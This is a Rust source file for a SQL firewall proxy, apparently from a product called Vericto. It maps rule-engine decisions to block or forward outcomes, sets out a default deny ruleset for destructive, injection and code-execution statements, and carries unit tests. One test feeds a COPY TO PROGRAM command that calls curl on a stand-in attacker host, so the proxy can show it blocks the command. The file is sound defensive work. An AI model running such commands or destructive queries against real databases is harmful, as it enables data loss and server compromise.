//! Bridge between the TCP proxy and the AST evaluation engine (in-process).
//!
//! The TCP proxy calls the existing parser and `RuleEngine` directly, without
//! going through HTTP. This keeps latency minimal on the critical path.

use vericto_engine::parser::{Dialect, parser_for};
use vericto_engine::{
    Decision, EnforcementAction, EnforcementPolicy, ParseErrorAction, ReportedViolation, Rule,
    RuleEngine, RuleType, Severity,
};

/// Result of evaluating a query on the TCP path.
pub enum TcpDecision {
    /// Forward to the real DB. `observation` carries violation info when the
    /// action was Flag or Monitor (for telemetry), the parse-error allow-report
    /// observation, or None when no rule matched.
    Forward {
        observation: Option<Observation>,
        /// Every rule the query violated, winner first. Carried alongside the
        /// observation rather than inside it because a parse-error observation has
        /// no engine violations to report.
        violations: Vec<ReportedViolation>,
    },
    /// Reject the query with SQLSTATE 42501.
    Block {
        rule_code: String,
        ast_node_path: String,
        suggested_safe_query: Option<String>,
        severity: Severity,
        /// Every rule the query violated, winner first. The block itself is
        /// decided by the winner alone; this is the audit trail, and reporting it
        /// cannot change the decision.
        violations: Vec<ReportedViolation>,
    },
}

/// A non-blocking violation (or parse-error allow-report) recorded for telemetry.
pub struct Observation {
    pub rule_code: String,
    pub ast_node_path: String,
    pub severity: Severity,
    /// Flag | Monitor (or Flag for a parse-error allow_report observation).
    pub action: EnforcementAction,
    /// Some when this is a parse-error observation; carries the parser message.
    pub parse_error: Option<String>,
}

/// Evaluates a SQL query against the given ruleset, resolving the winning
/// violation's action via the workspace `policy`.
///
/// - Parse OK → `RuleEngine::evaluate`; `Decision::Block` maps to `Block`,
///   `Decision::Flag`/`Decision::Allow` map to `Forward` carrying an
///   `Observation` built from the resolved action (None when no rule matched).
/// - Parse error → resolved from `policy.parse_error`: `AllowReport` (fail-open
///   default) forwards with a parse-error `Observation`; `Block` (fail-closed
///   opt-in) rejects with `VERICTO-PARSE-ERROR`.
pub fn evaluate(
    sql: &str,
    dialect: Dialect,
    rules: &[Rule],
    policy: &EnforcementPolicy,
) -> TcpDecision {
    let parser = parser_for(dialect);
    match parser.parse(sql) {
        Ok(parsed) => {
            let outcome = RuleEngine::evaluate(&parsed, rules, policy);
            match outcome.decision {
                Decision::Block => TcpDecision::Block {
                    rule_code: outcome.rule_code.unwrap_or_else(|| "VERICTO".to_string()),
                    ast_node_path: outcome.ast_node_path.unwrap_or_default(),
                    suggested_safe_query: outcome.suggested_safe_query,
                    severity: outcome.severity.unwrap_or(Severity::Critical),
                    violations: outcome.violations,
                },
                Decision::Flag | Decision::Allow => TcpDecision::Forward {
                    observation: outcome.action.map(|action| Observation {
                        rule_code: outcome
                            .rule_code
                            .clone()
                            .unwrap_or_else(|| "VERICTO".to_string()),
                        ast_node_path: outcome.ast_node_path.clone().unwrap_or_default(),
                        severity: outcome.severity.unwrap_or(Severity::Medium),
                        action,
                        parse_error: None,
                    }),
                    violations: outcome.violations,
                },
            }
        }
        Err(e) => match policy.parse_error {
            // Fail-open default (R5.5): forward + report.
            ParseErrorAction::AllowReport => TcpDecision::Forward {
                // A query that did not parse violated no rule: there is nothing to
                // enumerate, and the parse error itself travels in the observation.
                violations: Vec::new(),
                observation: Some(Observation {
                    rule_code: "VERICTO-PARSE-ERROR".to_string(),
                    ast_node_path: format!("PARSE_ERROR: {e}"),
                    // Parse-error telemetry severity is Medium by product decision (R8.6).
                    severity: Severity::Medium,
                    action: EnforcementAction::Flag,
                    parse_error: Some(e.to_string()),
                }),
            },
            // Fail-closed opt-in (R5.6): reject with 42501.
            ParseErrorAction::Block => TcpDecision::Block {
                rule_code: "VERICTO-PARSE-ERROR".to_string(),
                ast_node_path: format!("PARSE_ERROR: {e}"),
                suggested_safe_query: None,
                severity: Severity::Medium,
                violations: Vec::new(),
            },
        },
    }
}

/// Default ruleset: the built-in rules with their canonical severity and
/// recommended `default_action` (verbatim from the R13 table).
///
/// In production this ruleset would be resolved per workspace (querying the
/// API or database based on the `database` from the StartupMessage). For
/// single-tenant / dev mode these built-ins are the safe minimum.
pub fn default_ruleset() -> Vec<Rule> {
    // (code, severity, default_action) — verbatim from the R13 table.
    let rules: &[(&str, Severity, EnforcementAction)] = &[
        // Destructive-critical (Critical / BLOCK).
        ("VERICTO-001", Severity::Critical, EnforcementAction::Block), // DELETE without WHERE
        ("VERICTO-003", Severity::Critical, EnforcementAction::Block), // DELETE with always-true WHERE
        ("VERICTO-010", Severity::Critical, EnforcementAction::Block), // DROP TABLE / DATABASE
        ("VERICTO-011", Severity::Critical, EnforcementAction::Block), // TRUNCATE TABLE
        ("VERICTO-012", Severity::Critical, EnforcementAction::Block), // DROP SCHEMA
        ("VERICTO-030", Severity::Critical, EnforcementAction::Block), // UPDATE without WHERE (primary tables)
        ("VERICTO-042", Severity::Critical, EnforcementAction::Block), // UPDATE without WHERE
        ("VERICTO-090", Severity::Critical, EnforcementAction::Block), // OR tautology in WHERE (SQL injection)
        ("VERICTO-080", Severity::Critical, EnforcementAction::Block), // COPY … TO/FROM PROGRAM (server-side RCE)
        ("VERICTO-081", Severity::Critical, EnforcementAction::Block), // DO $$ … $$ anonymous code block
        // High / BLOCK.
        ("VERICTO-002", Severity::High, EnforcementAction::Block), // DELETE with LIMIT 0 (MySQL)
        ("VERICTO-013", Severity::High, EnforcementAction::Block), // DROP INDEX without IF EXISTS
        ("VERICTO-015", Severity::High, EnforcementAction::Block), // ALTER TABLE DROP COLUMN
        ("VERICTO-016", Severity::High, EnforcementAction::Block), // ALTER TABLE RENAME
        ("VERICTO-017", Severity::High, EnforcementAction::Block), // ALTER TABLE DROP CONSTRAINT
        ("VERICTO-018", Severity::High, EnforcementAction::Block), // ALTER TABLE ALTER COLUMN TYPE
        ("VERICTO-019", Severity::High, EnforcementAction::Block), // ALTER TABLE DISABLE TRIGGER / RLS
        ("VERICTO-031", Severity::High, EnforcementAction::Block), // UPDATE in CTE without WHERE
        ("VERICTO-033", Severity::High, EnforcementAction::Block), // DELETE in subquery without WHERE
        ("VERICTO-040", Severity::High, EnforcementAction::Block), // INSERT INTO … SELECT without filter
        ("VERICTO-070", Severity::High, EnforcementAction::Block), // SLEEP() / PG_SLEEP()
        ("VERICTO-082", Severity::High, EnforcementAction::Block), // GRANT / REVOKE
        ("VERICTO-083", Severity::High, EnforcementAction::Block), // MERGE (mass mutation)
        ("VERICTO-084", Severity::High, EnforcementAction::Block), // CREATE TABLE AS SELECT (bulk copy)
        // Medium / FLAG.
        ("VERICTO-050", Severity::Medium, EnforcementAction::Flag), // SELECT without LIMIT
        ("VERICTO-051", Severity::Medium, EnforcementAction::Flag), // SELECT * without WHERE
        ("VERICTO-061", Severity::Medium, EnforcementAction::Flag), // INSERT batch > 10k rows
        // Low / MONITOR.
        ("VERICTO-060", Severity::Low, EnforcementAction::Monitor), // INSERT without explicit columns
    ];

    rules
        .iter()
        .map(|(code, severity, default_action)| Rule {
            rule_id: code.to_string(),
            code: code.to_string(),
            severity: *severity,
            default_action: *default_action,
            rule_type: RuleType::Standard,
            ast_condition_yaml: None,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    // The R13 table (code, severity, default_action) — the authoritative source
    // of truth. `default_ruleset()` must match this verbatim (task 5.9).
    const R13: &[(&str, Severity, EnforcementAction)] = &[
        ("VERICTO-001", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-003", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-010", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-011", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-012", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-030", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-042", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-090", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-080", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-081", Severity::Critical, EnforcementAction::Block),
        ("VERICTO-002", Severity::High, EnforcementAction::Block),
        ("VERICTO-013", Severity::High, EnforcementAction::Block),
        ("VERICTO-015", Severity::High, EnforcementAction::Block),
        ("VERICTO-016", Severity::High, EnforcementAction::Block),
        ("VERICTO-017", Severity::High, EnforcementAction::Block),
        ("VERICTO-018", Severity::High, EnforcementAction::Block),
        ("VERICTO-019", Severity::High, EnforcementAction::Block),
        ("VERICTO-031", Severity::High, EnforcementAction::Block),
        ("VERICTO-033", Severity::High, EnforcementAction::Block),
        ("VERICTO-040", Severity::High, EnforcementAction::Block),
        ("VERICTO-070", Severity::High, EnforcementAction::Block),
        ("VERICTO-082", Severity::High, EnforcementAction::Block),
        ("VERICTO-083", Severity::High, EnforcementAction::Block),
        ("VERICTO-084", Severity::High, EnforcementAction::Block),
        ("VERICTO-050", Severity::Medium, EnforcementAction::Flag),
        ("VERICTO-051", Severity::Medium, EnforcementAction::Flag),
        ("VERICTO-061", Severity::Medium, EnforcementAction::Flag),
        ("VERICTO-060", Severity::Low, EnforcementAction::Monitor),
    ];

    // Task 5.9 — default_ruleset() matches the R13 table verbatim.
    #[test]
    fn default_ruleset_matches_r13_table_verbatim() {
        let ruleset = default_ruleset();
        assert_eq!(
            ruleset.len(),
            R13.len(),
            "default_ruleset() must have exactly the R13 entries"
        );
        for (rule, (code, severity, action)) in ruleset.iter().zip(R13.iter()) {
            assert_eq!(&rule.code, code, "rule code mismatch");
            assert_eq!(&rule.rule_id, code, "rule_id should equal the code");
            assert_eq!(rule.severity, *severity, "severity mismatch for {code}");
            assert_eq!(
                rule.default_action, *action,
                "default_action mismatch for {code}"
            );
        }
    }

    #[test]
    fn default_ruleset_vericto_050_is_medium_flag() {
        let ruleset = default_ruleset();
        let r = ruleset
            .iter()
            .find(|r| r.code == "VERICTO-050")
            .expect("VERICTO-050 present");
        assert_eq!(r.severity, Severity::Medium);
        assert_eq!(r.default_action, EnforcementAction::Flag);
    }

    // ── TcpDecision mapping (task 5.7) ────────────────────────────────────────

    // A DELETE without WHERE (VERICTO-001, Critical/Block) must Block.
    #[test]
    fn block_decision_does_not_forward() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate("DELETE FROM users", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Block {
                rule_code,
                severity,
                ..
            } => {
                assert_eq!(rule_code, "VERICTO-001");
                assert_eq!(severity, Severity::Critical);
            }
            TcpDecision::Forward { .. } => panic!("destructive query must Block, not Forward"),
        }
    }

    // A COPY … TO PROGRAM (VERICTO-080, Critical/Block) must Block via the
    // built-in default_ruleset — proves the new dangerous-statement codes are
    // wired into the proxy's fallback catalogue.
    #[test]
    fn copy_program_blocks_via_default_ruleset() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate(
            "COPY users TO PROGRAM 'curl https://evil.example'",
            Dialect::Postgres,
            &rules,
            &policy,
        );
        match decision {
            TcpDecision::Block {
                rule_code,
                severity,
                ..
            } => {
                assert_eq!(rule_code, "VERICTO-080");
                assert_eq!(severity, Severity::Critical);
            }
            TcpDecision::Forward { .. } => panic!("COPY … PROGRAM must Block"),
        }
    }

    // A SELECT without LIMIT (VERICTO-050, Medium/Flag) must Forward with an
    // Observation carrying the Flag action.
    #[test]
    fn flag_decision_forwards_with_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate("SELECT * FROM users", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.action, EnforcementAction::Flag);
                assert!(obs.parse_error.is_none());
                assert!(obs.rule_code.starts_with("VERICTO-"));
            }
            TcpDecision::Forward {
                observation: None, ..
            } => {
                panic!("a flagged query must carry an observation")
            }
            TcpDecision::Block { .. } => panic!("a Medium/Flag query must Forward, not Block"),
        }
    }

    // A Low/Monitor rule must Forward with a Monitor observation.
    #[test]
    fn monitor_decision_forwards_with_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        // VERICTO-060: INSERT without explicit column list → Low/Monitor.
        let decision = evaluate(
            "INSERT INTO users VALUES (1, 'a')",
            Dialect::Postgres,
            &rules,
            &policy,
        );
        match decision {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.action, EnforcementAction::Monitor);
                assert!(obs.parse_error.is_none());
            }
            TcpDecision::Forward {
                observation: None, ..
            } => {
                panic!("a monitored query must carry an observation")
            }
            TcpDecision::Block { .. } => panic!("a Low/Monitor query must Forward, not Block"),
        }
    }

    // A query that matches no rule must Forward with no observation (Allow).
    #[test]
    fn allow_decision_forwards_without_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate(
            "SELECT id FROM users WHERE id = 1 LIMIT 10",
            Dialect::Postgres,
            &rules,
            &policy,
        );
        match decision {
            TcpDecision::Forward { observation, .. } => assert!(
                observation.is_none(),
                "a clean query must not carry an observation"
            ),
            TcpDecision::Block { .. } => panic!("a clean query must Forward, not Block"),
        }
    }

    // Parse error, fail-open (default AllowReport) → Forward + parse-error Observation.
    #[test]
    fn parse_error_fail_open_forwards_with_observation() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy::default();
        let decision = evaluate("NOT A VALID SQL @@@", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Forward {
                observation: Some(obs),
                ..
            } => {
                assert_eq!(obs.rule_code, "VERICTO-PARSE-ERROR");
                assert_eq!(obs.action, EnforcementAction::Flag);
                assert_eq!(obs.severity, Severity::Medium);
                assert!(obs.parse_error.is_some());
            }
            _ => panic!("parse-error fail-open must Forward with a parse-error observation"),
        }
    }

    // Parse error, fail-closed (Block) → Block with VERICTO-PARSE-ERROR.
    #[test]
    fn parse_error_fail_closed_blocks() {
        let rules = default_ruleset();
        let policy = EnforcementPolicy {
            parse_error: ParseErrorAction::Block,
            ..EnforcementPolicy::default()
        };
        let decision = evaluate("NOT A VALID SQL @@@", Dialect::Postgres, &rules, &policy);
        match decision {
            TcpDecision::Block { rule_code, .. } => {
                assert_eq!(rule_code, "VERICTO-PARSE-ERROR");
            }
            TcpDecision::Forward { .. } => {
                panic!("parse-error fail-closed must Block, not Forward")
            }
        }
    }
}
